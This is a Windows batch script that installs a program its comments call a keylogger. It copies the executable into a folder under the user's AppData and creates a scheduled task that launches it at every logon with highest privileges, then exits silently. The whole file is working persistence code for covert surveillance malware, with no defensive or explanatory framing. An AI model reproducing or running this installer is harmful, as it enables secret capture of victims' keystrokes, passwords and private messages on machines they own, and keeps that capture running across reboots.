@echo off
REM Set the source path of the keylogger executable
set KEYLOGGER_PATH=main.exe  REM Update with the actual name of your executable

REM Set the destination path to a hidden folder in the user's AppData
set DEST_PATH=%APPDATA%\Keylogger\main.exe

REM Create the destination directory if it doesn't exist
if not exist "%APPDATA%\Keylogger" (
    mkdir "%APPDATA%\Keylogger"
)

REM Copy the keylogger to the destination
copy /Y "%~dp0%KEYLOGGER_PATH%" "%DEST_PATH%"

REM Create a scheduled task to run the keylogger at startup
schtasks /create /tn "Keylogger" /tr "%DEST_PATH%" /sc onlogon /rl highest /f

REM Exit silently
exit
